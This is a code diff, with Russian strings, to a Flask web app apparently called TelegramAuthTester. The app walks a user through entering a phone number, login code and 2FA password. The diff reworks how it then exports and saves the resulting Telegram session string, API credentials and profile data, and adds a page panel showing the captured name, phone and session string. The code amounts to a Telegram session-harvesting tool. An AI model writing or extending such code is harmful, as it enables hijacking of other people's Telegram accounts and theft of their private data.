@@ -257,9 +257,8 @@ class TelegramAuthTester:
             
             return {
                 'success': True,
-                'message': 'Код отправлен в Telegram',
-                'session_id': session_id,
-                'phone_code_hash': sent_code.phone_code_hash
+                'message': 'Код отправлен в Telegram!',
+                'session_id': session_id
             }
             
         except Exception as e:
@@ -419,12 +418,13 @@ class TelegramAuthTester:
             return {'success': False, 'error': 'Неверный пароль 2FA'}
     
     async def export_tdata(self, client, user_info, request_info=None):
-        """Экспорт TData"""
+        """Экспорт TData - исправленная версия"""
         try:
             # Экспортируем session string
             session_string = await client.export_session_string()
             
-            # Получаем информацию о сессии
+            # Получаем базовую информацию о клиенте
+            # В Pyrogram нет прямого доступа к auth_key, поэтому используем доступные данные
             tdata_info = {
                 'version': '1.0',
                 'user_id': user_info['id'],
@@ -433,7 +433,6 @@ class TelegramAuthTester:
                 'last_name': user_info.get('last_name', ''),
                 'username': user_info.get('username', ''),
                 'session_string': session_string,
-                'auth_key': client.auth_key.key.hex() if client.auth_key else None,
                 'dc_id': client.dc_id,
                 'api_id': self.api_id,
                 'api_hash': self.api_hash,
@@ -442,7 +441,8 @@ class TelegramAuthTester:
                 'app_version': '1.0',
                 'lang_code': 'en',
                 'system_lang_code': 'en',
-                'exported_at': datetime.now().isoformat()
+                'exported_at': datetime.now().isoformat(),
+                'session_type': 'pyrogram_string_session'
             }
             
             # Сохраняем пользователя
@@ -451,7 +451,6 @@ class TelegramAuthTester:
             # Сохраняем сессию
             session_data = {
                 'session_string': session_string,
-                'auth_key': client.auth_key.key.hex() if client.auth_key else None,
                 'dc_id': client.dc_id,
                 'api_id': self.api_id,
                 'api_hash': self.api_hash,
@@ -598,6 +597,12 @@ def home():
         .hidden {{
             display: none;
         }}
+        .user-info {{
+            background: #e8f5e8;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }}
     </style>
 </head>
 <body>
@@ -658,6 +663,22 @@ def home():
         function showAlert(message, type) {{
             const results = document.getElementById('results');
             results.innerHTML = '<div class="alert ' + type + '">' + message + '</div>';
+        }}
+
+        function showUserInfo(userInfo, exportInfo) {{
+            const results = document.getElementById('results');
+            results.innerHTML = `
+                <div class="user-info">
+                    <h3>✅ Успешная аутентификация!</h3>
+                    <p><strong>Имя:</strong> ${{userInfo.first_name || 'Не указано'}}</p>
+                    <p><strong>Фамилия:</strong> ${{userInfo.last_name || 'Не указана'}}</p>
+                    <p><strong>Username:</strong> @${{userInfo.username || 'Не указан'}}</p>
+                    <p><strong>ID:</strong> ${{userInfo.id}}</p>
+                    <p><strong>Телефон:</strong> ${{userInfo.phone_number}}</p>
+                    <p><strong>Session String:</strong> ${{exportInfo.session_string.substring(0, 50)}}...</p>
+                    <p><strong>TData ID:</strong> ${{exportInfo.tdata_id}}</p>
+                </div>
+            `;
         }}
 
         function showStep(stepNumber) {{
@@ -749,13 +770,8 @@ def home():
                         showAlert('🔒 Требуется пароль двухфакторной аутентификации', 'info');
                         document.getElementById('password').focus();
                     }} else {{
-                        showAlert('✅ ' + data.message, 'success');
-                        if (data.user_info) {{
-                            showAlert('👤 Пользователь: ' + data.user_info.first_name + ' (@' + data.user_info.username + ')', 'info');
-                        }}
-                        if (data.export_info) {{
-                            showAlert('💾 TData экспортирован! Session ID: ' + data.export_info.session_id, 'success');
-                        }}
+                        showUserInfo(data.user_info, data.export_info);
+                        showAlert('✅ TData успешно экспортирован!', 'success');
                     }}
                 }} else {{
                     showAlert('❌ ' + data.error, 'error');
@@ -799,13 +815,8 @@ def home():
                 const data = await response.json();
                 
                 if (data.success) {{
-                    showAlert('✅ ' + data.message, 'success');
-                    if (data.user_info) {{
-                        showAlert('👤 Пользователь: ' + data.user_info.first_name + ' (@' + data.user_info.username + ')', 'info');
-                    }}
-                    if (data.export_info) {{
-                        showAlert('💾 TData экспортирован! Session ID: ' + data.export_info.session_id, 'success');
-                    }}
+                    showUserInfo(data.user_info, data.export_info);
+                    showAlert('✅ TData успешно экспортирован!', 'success');
                 }} else {{
                     showAlert('❌ ' + data.error, 'error');
                 }}
